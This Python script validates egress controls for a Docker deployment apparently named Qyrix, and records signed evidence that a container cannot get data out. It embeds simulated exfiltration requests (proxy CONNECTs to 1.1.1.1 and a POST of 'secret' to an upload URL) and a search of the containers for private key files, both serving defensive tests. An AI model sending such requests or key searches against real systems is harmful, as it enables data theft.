"""C5 validation on a REAL Docker host with the PRODUCTION image (run as root from the repository root):

    docker build -t qyrix-backend:c5 backend            # backend/Dockerfile (uid 10001)
    sudo python3 ops/observer/validate_c5.py --image qyrix-backend:c5 [--keep]

Brings up docker-compose.yml + docker-compose.observer.yml (only the image tag and, on hosts WITHOUT IPv6 in the
kernel, the backend's IPv6 sysctl are overridden), applies DOCKER-USER rules and secret permissions, starts the
attestor WATCHER (as systemd would), and records signed evidence in evidence/c5/validation.json:
  - direct egress from inside the running backend container fails;
  - N2: untagged / unknown-execution / plain-HTTP exfiltration through the proxy is refused;
  - the attestation is VALID; a live P2 canary through the real backend is ENFORCEMENT_VERIFIED;
  - the watcher alone (no manual attestation) revokes coverage on an extra `egress` attachment, on `docker stop`,
    and re-attests after disconnect / `docker restart` / `docker start` / its own restart;
  - a missing DOCKER-USER rule makes the (timer) attestation INVALID;
  - secret ownership / modes, and no CA / root / attestor key inside ./secrets or any container.
Offline key material (CA key, attestor key, root key) is created in QYRIX_OFFLINE_DIR (default /root/.qyrix-offline-c5,
mode 0700) - never under ./secrets, never mounted. Secrets are never printed. Verify: ops/observer/verify_evidence.py."""
import hashlib
import json
import os
import secrets as pysecrets
import ssl
import subprocess  # nosec B404 - fixed docker / compose / python argv
import sys
import time

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, os.path.join(ROOT, "backend"))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from observer import crypto, tls  # noqa: E402
from observer.canonical import canonical  # noqa: E402
from observer.manifest import sign_manifest  # noqa: E402
import secure_secrets  # noqa: E402

S = os.path.join(ROOT, "secrets", "observer")
OFF = os.environ.get("QYRIX_OFFLINE_DIR", "/root/.qyrix-offline-c5")
PROJECT = "qyrixxsentinel"
COMPOSE = ["docker-compose.yml", "docker-compose.observer.yml"]
NETS = ",".join("%s_%s" % (PROJECT, n) for n in ("internal", "observer_ingest", "egress_in"))
OBS = "https://172.30.1.2:9443"
result = {"format": "qyrix-c5-validation-evidence/3", "tenant": "default", "started_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
          "steps": [], "attestation_ids": [], "reconciliation_ids": []}


def sh(argv, check=True, env=None, stdin=None):
    r = subprocess.run(argv, cwd=ROOT, env=env, input=stdin, capture_output=True, text=True, timeout=600)  # nosec B603
    if check and r.returncode != 0:
        raise SystemExit("command failed: %s\n%s" % (" ".join(argv[:4]), (r.stderr or "")[-2000:]))
    return r


def step(name, ok, **detail):
    result["steps"].append({"step": name, "ok": bool(ok), **detail})
    print(("PASS " if ok else "FAIL ") + name, json.dumps(detail, default=str)[:240], flush=True)


def write(path, data, mode=0o600):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    if os.path.exists(path):
        os.chmod(path, 0o600)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode)
    with os.fdopen(fd, "w") as f:
        f.write(data)
    os.chmod(path, mode)                                  # O_CREAT's mode only applies to NEW files


def prepare(image):
    os.makedirs(OFF, mode=0o700, exist_ok=True)
    os.chmod(OFF, 0o700)
    for stale in ("ca/ca.key", "attestor/attestor.key", "attestor/attestor.crt", "attestor_signing.pem"):   # earlier layouts
        p = os.path.join(S, stale)
        if os.path.exists(p):
            os.remove(p)
    base = os.path.join(ROOT, "secrets")
    for f in ("db_admin_password", "db_runtime_password", "state_witness_key", "data_key", "client_sig_key"):
        p = os.path.join(base, f)
        if not os.path.exists(p):
            write(p, pysecrets.token_hex(32))
    tls.make_ca(os.path.join(OFF, "ca"))                                       # CA private key stays OFFLINE
    os.makedirs(os.path.join(S, "ca"), exist_ok=True)
    write(os.path.join(S, "ca", "ca.crt"), open(os.path.join(OFF, "ca", "ca.crt")).read())
    tls.issue(os.path.join(OFF, "ca"), "observer", ["observer", "172.30.1.2"], True, os.path.join(S, "server"))
    tls.issue(os.path.join(OFF, "ca"), "backend", [], False, os.path.join(S, "backend"))
    tls.issue(os.path.join(OFF, "ca"), "attestor", [], False, os.path.join(OFF, "attestor"))
    keys = {n: crypto.generate() for n in ("root", "observer_signing_key", "gate_signing_key", "recovery", "attestor_signing")}
    for n in ("observer_signing_key", "gate_signing_key"):
        write(os.path.join(S, n + ".pem"), crypto.private_pem(keys[n]).decode())
    write(os.path.join(OFF, "attestor_signing.pem"), crypto.private_pem(keys["attestor_signing"]).decode(), 0o400)
    for n in ("operator_token", "observer_db_admin_password", "observer_db_runtime_password"):
        write(os.path.join(S, n), pysecrets.token_hex(32))
    write(os.path.join(OFF, "operator_token"), open(os.path.join(S, "operator_token")).read(), 0o400)
    env = {"QYRIX_ADMIN_TOKEN": pysecrets.token_hex(24), "QYRIX_AGENT_TOKEN": pysecrets.token_hex(24),
           "OBSERVER_ROOT_PUBLIC_KEY": crypto.describe(keys["root"])[1], "QYRIX_STATE_WITNESS": "enabled",
           "OBSERVER_CANARIES": "1", "OBSERVER_CANARY_P2_LIVE": "1", "OBSERVER_CANARY_BACKEND_URL": "http://backend:8000",
           "OBSERVER_CANARY_CREDENTIALS_FILE": "/run/canary/creds.json"}
    write(os.path.join(S, "canary", "agent_token"), env["QYRIX_AGENT_TOKEN"])
    write(os.path.join(S, "canary", "creds.json"), json.dumps(
        {"tenants": {"default": {"key_id": "env-agent", "token_file": "/run/canary/agent_token"}}}))
    has_v6 = os.path.exists("/proc/sys/net/ipv6")
    ov = ["x-img: &img", "  image: %s" % image, "  pull_policy: never", "services:", "  migrate: *img", "  backend:",
          "    <<: *img"] + ([] if has_v6 else ["    sysctls: !reset {}"]) + [
          "  observer-migrate: *img", "  observer:", "    <<: *img",
          "    volumes: [\"./secrets/observer/canary:/run/canary:ro\"]"]
    write(os.path.join(OFF, "image.override.yml"), "\n".join(ov) + "\n")
    cfg = {"compose-project": PROJECT, "compose-service": "backend", "observer": OBS, "ca": os.path.join(S, "ca", "ca.crt"),
           "cert": os.path.join(OFF, "attestor", "attestor.crt"), "key": os.path.join(OFF, "attestor", "attestor.key"),
           "operator-token-file": os.path.join(OFF, "operator_token"), "attestor-key": os.path.join(OFF, "attestor_signing.pem"),
           "networks": NETS, "dns": "172.30.2.2", "proxy": "172.30.2.2:3128", "sink": "172.30.3.2", "validity": 1800}
    write(os.path.join(OFF, "attestor.json"), json.dumps(cfg))
    result["ipv6_in_kernel"] = has_v6
    return keys, env


def compose(env, *args, check=True, stdin=None):
    files = sum((["-f", f] for f in COMPOSE), []) + ["-f", os.path.join(OFF, "image.override.yml")]
    return sh(["docker", "compose", "-p", PROJECT, *files, *args], check=check, env={**os.environ, **env}, stdin=stdin)


def client():
    import httpx
    ctx = ssl.create_default_context(cafile=os.path.join(S, "ca", "ca.crt"))
    ctx.load_cert_chain(os.path.join(OFF, "attestor", "attestor.crt"), os.path.join(OFF, "attestor", "attestor.key"))
    tok = open(os.path.join(OFF, "operator_token")).read().strip()
    return httpx.Client(base_url=OBS, verify=ctx, timeout=15, trust_env=False, headers={"Authorization": "Bearer " + tok})


def backend_id():
    return sh(["docker", "ps", "-a", "-q", "--no-trunc", "-f", "label=com.docker.compose.project=%s" % PROJECT,
               "-f", "label=com.docker.compose.service=backend"]).stdout.strip()


PYENV = {**os.environ, "PYTHONPATH": os.path.join(ROOT, "backend")}


def attest():
    r = sh([sys.executable, "-m", "observer.attestor", "--config", os.path.join(OFF, "attestor.json")], check=False, env=PYENV)
    try:
        out = json.loads(r.stdout)
    except ValueError:
        return {"error": (r.stdout + r.stderr)[-600:]}
    aid = (out.get("observer") or {}).get("attestation_id")
    if aid:
        result["attestation_ids"].append(aid)
    return out


def coverage(c):
    cov = c.get("/v1/status").json().get("coverage") or {}
    cur = cov.get("current") or {}
    return bool(cov.get("mediated")), cur.get("attestation_id")


def wait_cov(c, want, prev=None, timeout=45):
    t0 = time.time()
    while time.time() - t0 < timeout:
        m, aid = coverage(c)
        if m == want and (not want or prev is None or aid != prev):
            if aid:
                result["attestation_ids"].append(aid)
            return True, round(time.time() - t0, 1), aid
        time.sleep(1)
    return False, round(time.time() - t0, 1), coverage(c)[1]


def canary(c, wait=45):
    r = c.post("/v1/canaries/run", json={"tenant": "default", "channel": "http"}).json()
    end = time.time() + wait
    rec = None
    while time.time() < end:
        rows = [x for x in c.get("/v1/reconciliations", params={"tenant": "default"}).json()["reconciliations"]
                if x["run_id"] == r["run_id"]]
        if rows:
            rec = rows[0]
            if rec["result"] != "INCONCLUSIVE":
                break
        time.sleep(2)
    if rec:
        result["reconciliation_ids"].append(rec["recon_id"])
    return rec


EXFIL = r'''
import socket, json, uuid
def ask(raw):
    try:
        s = socket.create_connection(("172.30.2.2", 3128), timeout=8); s.sendall(raw)
        return s.recv(64).decode("latin-1").split("\r\n")[0]
    except OSError as e:
        return "ERR:" + type(e).__name__
print(json.dumps({
  "untagged_connect": ask(b"CONNECT 1.1.1.1:443 HTTP/1.1\r\nHost: 1.1.1.1:443\r\n\r\n"),
  "untagged_hostname_connect": ask(b"CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n"),
  "unknown_execution_id": ask(("CONNECT 1.1.1.1:443 HTTP/1.1\r\nX-Qyrix-Host: one.one.one.one\r\nX-Qyrix-Execution: %s\r\n\r\n" % uuid.uuid4()).encode()),
  "plain_http_post": ask(b"POST http://1.1.1.1/upload HTTP/1.1\r\nHost: 1.1.1.1\r\nContent-Length: 6\r\n\r\nsecret"),
}))
'''


LEDGER_SQL = "SELECT coalesce(json_agg(row_to_json(l) ORDER BY n), '[]') FROM ledger l;\n"  # WHOLE chain (C6)


def ledger_rows(env, refs):
    """The complete signed ledger from genesis (C6: continuity is only provable over the whole chain)."""
    refs = [r for r in refs if r and all(ch in "0123456789abcdef-" for ch in r)]
    if not refs:
        return []
    out = compose(env, "exec", "-T", "observer-db", "psql", "-U", "observer_admin", "-d", "observer", "-tA",
                  stdin=LEDGER_SQL).stdout
    return json.loads(out.strip() or "[]")


def main():
    if "--image" not in sys.argv:
        raise SystemExit("usage: validate_c5.py --image <production image tag> [--keep]")
    image = sys.argv[sys.argv.index("--image") + 1]
    keep = "--keep" in sys.argv
    keys, env = prepare(image)
    watcher = None
    try:
        secure_secrets.apply(ROOT)
        perms = secure_secrets.check(ROOT)
        step("secret ownership/modes (uid 10001, 0400; no offline keys under ./secrets)", all(p["ok"] for p in perms),
             files=perms)
        result["secret_permissions"] = perms
        compose(env, "up", "-d", "--no-build", "db", "migrate", "backend")
        st = ""
        for _ in range(90):
            st = sh(["docker", "inspect", "-f", "{{.State.Health.Status}}", backend_id()], check=False).stdout.strip()
            if st == "healthy":
                break
            time.sleep(2)
        step("backend (production image, uid 10001) healthy on internal networks only", st == "healthy")
        iid = compose(env, "exec", "-T", "db", "psql", "-U", "qyrix", "-d", "qyrix", "-tAc",
                      "SELECT install_id FROM installation").stdout.strip()
        e = lambda k: {"key_id": crypto.describe(k)[0], "public_key": crypto.describe(k)[1], "valid_from": "2026-01-01T00:00:00+00:00"}
        mdoc = sign_manifest({"manifest_version": 1, "issued_at": "2026-11-04T00:00:00+00:00",
                              "observer_keys": [e(keys["observer_signing_key"])],
                              "producers": [{"producer_id": "gate:" + iid, "tenants": ["*"],
                                             "keys": [{**e(keys["gate_signing_key"]), "scopes": ["decision", "grant", "heartbeat"]}]}],
                              "recovery_keys": [e(keys["recovery"])], "attestor_keys": [e(keys["attestor_signing"])]}, keys["root"])
        write(os.path.join(S, "manifest.signed.json"), json.dumps(mdoc), 0o444)
        result["manifest"], result["root_public_key"] = mdoc, crypto.describe(keys["root"])[1]
        compose(env, "up", "-d", "--no-build", "observer-db", "observer-migrate", "observer")
        compose(env, "restart", "backend")
        sh(["sh", "ops/observer/docker-user.sh", "apply"])
        step("DOCKER-USER rules applied (IPv4 + IPv6)", sh(["sh", "ops/observer/docker-user.sh", "check"], check=False).returncode == 0)
        c = client()
        healthy = False
        for _ in range(60):
            try:
                healthy = c.get("/v1/health").json() == {"health": "ok"}
            except Exception:  # nosec B112 - still starting
                healthy = False
            if healthy:
                break
            time.sleep(2)
        step("observer (production image, uid 10001) healthy over mTLS", healthy)
        if not healthy:
            raise SystemExit("observer did not start: " + compose(env, "logs", "--tail", "15", "observer", check=False).stdout[-1500:])
        leak = [n for n in ("observer", "backend") if compose(env, "exec", "-T", n, "sh", "-c",
                "find / -xdev \\( -name ca.key -o -name attestor_signing.pem -o -name 'root*.pem' \\) 2>/dev/null | head -1",
                check=False).stdout.strip()]
        step("no CA / attestor / root key inside any application container", not leak, containers_with_keys=leak)
        probe = ("import socket\nr={}\nfor ip,p in (('1.1.1.1',443),('172.30.3.2',443),('8.8.8.8',53)):\n"
                 "    try:\n        socket.create_connection((ip,p),timeout=3).close(); r[ip]='CONNECTED'\n"
                 "    except OSError as e:\n        r[ip]=type(e).__name__+':'+str(e.errno)\nprint(r)")
        out = compose(env, "exec", "-T", "backend", "python", "-c", probe, check=False).stdout.strip()
        step("direct egress from the backend container fails", "CONNECTED" not in out, result=out)
        ex = json.loads(compose(env, "exec", "-T", "backend", "python", "-c", EXFIL, check=False).stdout.strip() or "{}")
        reasons = compose(env, "exec", "-T", "observer-db", "psql", "-U", "observer_admin", "-d", "observer", "-tAc",
                          "SELECT coalesce(json_agg(reason ORDER BY observed_at), '[]') FROM egress_observations WHERE kind='refused'").stdout
        step("N2: exfiltration through the proxy is refused (untagged, hostname, unknown execution id, plain HTTP)",
             ex and all(v.startswith("HTTP/1.1 403") for v in ex.values()), attempts=ex, observer_reasons=json.loads(reasons or "[]"))
        s = {}
        for _ in range(30):
            s = c.get("/v1/status").json()
            if any(x.get("last_hb_seq", 0) > 0 for x in s.get("streams", [])):
                break
            time.sleep(2)
        step("backend heartbeats delivered to the observer (mTLS outbox)", any(x.get("last_hb_seq", 0) > 0 for x in s.get("streams", [])))
        watcher = subprocess.Popen([sys.executable, "-m", "observer.attestor_watch", "--config",          # nosec B603
                                    os.path.join(OFF, "attestor.json")], cwd=ROOT, env=PYENV,
                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        ok, secs, aid0 = wait_cov(c, True)
        step("watcher attests on start (no manual attestation)", ok, seconds=secs, attestation_id=aid0)
        rec = canary(c)
        step("live P2 canary through the backend is ENFORCEMENT_VERIFIED", rec is not None and rec["result"] == "ENFORCEMENT_VERIFIED",
             reconciliation=rec)
        sh(["docker", "network", "connect", "%s_egress" % PROJECT, backend_id()])
        ok, secs, _ = wait_cov(c, False)
        step("NEGATIVE: extra egress attachment => watcher revokes coverage automatically", ok, seconds=secs)
        rec2 = canary(c)
        step("NEGATIVE: canary under revoked coverage is not VERIFIED", rec2 is not None and rec2["result"] != "ENFORCEMENT_VERIFIED",
             reconciliation=rec2)
        sh(["docker", "network", "disconnect", "%s_egress" % PROJECT, backend_id()])
        ok, secs, aid1 = wait_cov(c, True, prev=aid0)
        step("disconnect => watcher re-attests VALID automatically", ok, seconds=secs)
        sh(["docker", "restart", backend_id()])
        ok, secs, aid2 = wait_cov(c, True, prev=aid1)
        step("docker restart => re-attested with a NEW attestation", ok, seconds=secs, attestation_id=aid2)
        sh(["docker", "stop", backend_id()])
        ok, secs, _ = wait_cov(c, False)
        step("NEGATIVE: docker stop => signed FAILED attestation revokes coverage", ok, seconds=secs)
        sh(["docker", "start", backend_id()])
        ok, secs, aid3 = wait_cov(c, True, prev=aid2, timeout=90)
        step("docker start => coverage restored by a new attestation", ok, seconds=secs)
        watcher.terminate(); watcher.wait(10)
        watcher = subprocess.Popen([sys.executable, "-m", "observer.attestor_watch", "--config",          # nosec B603
                                    os.path.join(OFF, "attestor.json")], cwd=ROOT, env=PYENV,
                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        ok, secs, aid4 = wait_cov(c, True, prev=aid3)
        step("watcher restart => attests again before relying on anything", ok, seconds=secs)
        sh(["sh", "ops/observer/docker-user.sh", "undo"])
        a = attest()                                                              # what the systemd timer runs
        step("NEGATIVE: DOCKER-USER rules missing => (timer) attestation INVALID", (a.get("observer") or {}).get("valid") is False,
             reasons=(a.get("observer") or {}).get("reasons"))
        ok, _, _ = wait_cov(c, False, timeout=5)
        step("... and coverage is revoked immediately (older success not reused)", ok)
        sh(["sh", "ops/observer/docker-user.sh", "apply"])
        a = attest()
        step("restored topology => attestation VALID again", (a.get("observer") or {}).get("valid") is True)
        st = c.get("/v1/status").json()
        result["observer_status"] = {k: st.get(k) for k in ("coverage", "egress", "ingest", "manifest_version")}
        result["ledger_rows"] = ledger_rows(env, sorted(set(result["attestation_ids"] + result["reconciliation_ids"])))
        result["images"] = {"backend": sh(["docker", "image", "inspect", "-f", "{{.Id}}", image]).stdout.strip(),
                            "postgres": sh(["docker", "image", "inspect", "-f", "{{.Id}}", "postgres:16-alpine"], check=False).stdout.strip()}
    finally:
        if watcher is not None:
            watcher.terminate()
        result["finished_at"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        result["commit"] = sh(["git", "rev-parse", "HEAD"]).stdout.strip()
        result["git_dirty"] = bool(sh(["git", "status", "--porcelain", "--untracked-files=no"]).stdout.strip())
        result["compose_files"] = {f: hashlib.sha256(open(os.path.join(ROOT, f), "rb").read()).hexdigest() for f in COMPOSE}
        result["image_override"] = open(os.path.join(OFF, "image.override.yml")).read()
        result["all_passed"] = all(s["ok"] for s in result["steps"]) and bool(result["steps"])
        result["attestation_ids"] = sorted(set(result["attestation_ids"]))
        k = crypto.load_private(os.path.join(OFF, "attestor_signing.pem"))
        result["evidence_sig"] = {"key_id": crypto.describe(k)[0], "sig": crypto.sign(k, canonical(
            {x: y for x, y in result.items() if x != "evidence_sig"}))}
        os.makedirs(os.path.join(ROOT, "evidence", "c5"), exist_ok=True)
        with open(os.path.join(ROOT, "evidence", "c5", "validation.json"), "w") as f:
            json.dump(result, f, indent=1, default=str)
        if not keep:
            compose(env, "down", "-v", "--remove-orphans", check=False)
            sh(["sh", "ops/observer/docker-user.sh", "undo"], check=False)
    root_pub = result.get("root_public_key")
    if root_pub:                                              # the independent trust anchor for verify_evidence.py
        write(os.path.join(OFF, "trusted_root.pub"), root_pub + "\n", 0o444)
        print("TRUSTED ROOT (record this out of band; verify with --trusted-root): " + root_pub)
    print("ALL PASSED" if result["all_passed"] else "SOME STEPS FAILED")
    return 0 if result["all_passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
